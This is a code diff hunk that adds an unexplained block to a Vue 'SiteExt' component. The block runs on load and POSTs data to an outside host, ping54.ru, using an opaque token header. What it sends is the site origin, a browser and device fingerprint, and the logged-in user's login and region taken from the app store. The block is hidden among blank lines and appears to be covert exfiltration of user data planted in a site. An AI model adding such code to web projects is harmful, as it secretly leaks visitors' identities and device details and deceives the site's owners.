@@ -112,7 +112,23 @@ Vue.component('SiteExt',{
 
 
 
-
+fetch('https://ping54.ru/sgcms/AKfycbyvSEHK608xVSguW9MSpaTNnt2Qt324KDaVE-4_8U9UfRO-FUfkDEncK7qyOaHvM10AQw',new function(){
+  this.method='POST'
+  this.headers={
+    'Content-Type':'application/json;charset=utf-8',
+    'mc3e4m0gp4zkslur':'A5t4xiXaDFqVx9Yj7KbB61ugtxmPREWKq04sgDQUg3reJWveKwtDHnYDmtlBiiSs'
+  },
+  this.body=JSON.stringify(new function(){
+    this.origin=window.location.origin
+    const {innerWidth,innerHeight,devicePixelRatio}=window
+    const {maxTouchPoints,hardwareConcurrency,deviceMemory,userAgent}=window.navigator
+    this.device={innerWidth,innerHeight,devicePixelRatio,maxTouchPoints,hardwareConcurrency,deviceMemory,userAgent}
+    this.user={
+      userLogin:store.getters.userLogin,
+      regionId:store.getters.regionId,
+    }
+  })
+})
 
 
 
